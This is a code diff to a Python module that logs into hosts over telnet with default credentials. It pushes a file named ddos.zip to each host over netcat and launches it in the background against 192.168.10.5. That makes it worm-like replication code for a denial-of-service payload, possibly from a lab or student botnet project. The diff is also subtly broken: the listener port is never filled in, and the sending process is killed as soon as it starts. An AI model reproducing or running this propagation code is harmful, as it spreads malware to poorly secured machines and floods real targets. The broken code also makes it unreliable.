@@ -3,9 +3,12 @@ Connect to hosts via telnet
 """
 
 import os
+import subprocess
 import telnetlib
 import search
 import socket
+import time
+import random
 
 from constants import DEFAULT_LOGINS
 
@@ -42,16 +45,22 @@ def login(host, username, password):
 def replicate(tn):
     try:
         # Open nc connection to receive the file
-        tn.write(b"nc -l -p 10000 > ddos.zip\r\n")
-        os.system("nc -w 5 {} 10000 < ddos.zip".format(tn.host))
+        random_port = random.randint(5000, 5100)
+        print(random_port)
+        tn.write(b"nc -l -p {} > ddos.zip\n")
+        netcat_command = "nc -w 5 {} {} < ddos.zip".format(tn.host, random_port)
+
+        process = subprocess.Popen(netcat_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process.kill()
+
         # Execute script
-        tn.write(b"nohup python3 ddos.zip 192.168.10.5 5 &\r\n")
+        tn.write(b"nohup python3 ddos.zip 192.168.10.5 5 &\n")
         tn.write(b"exit\r\n")
         tn.close()   
     except EOFError:
         print("Connection to host lost")
-    except: 
-        print("Replication error")
+    #except: 
+    #    print("Replication error")
 
 
 def network_replicate():
